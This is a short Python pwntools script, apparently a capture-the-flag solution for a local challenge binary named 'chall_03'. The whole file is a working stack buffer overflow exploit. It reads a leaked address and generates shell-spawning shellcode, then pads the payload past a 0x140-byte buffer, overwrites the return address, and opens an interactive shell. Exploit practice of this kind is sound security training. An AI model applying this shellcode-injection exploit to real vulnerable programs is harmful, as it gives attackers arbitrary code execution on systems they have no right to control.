# coding: utf-8
from pwn import *
def chall03():
    p=process("./chall_03")
    p.recvuntil(":)")
    context.arch="amd64"
    a=asm(shellcraft.sh())
    len_a=len(a)
    leak=p.recv()
    main=int(leak,16)
    payload=(a+b"a"*(0x140-len_a)+b"a"*8+p64(main))
    p.sendline(payload)
    p.interactive()
chall03()
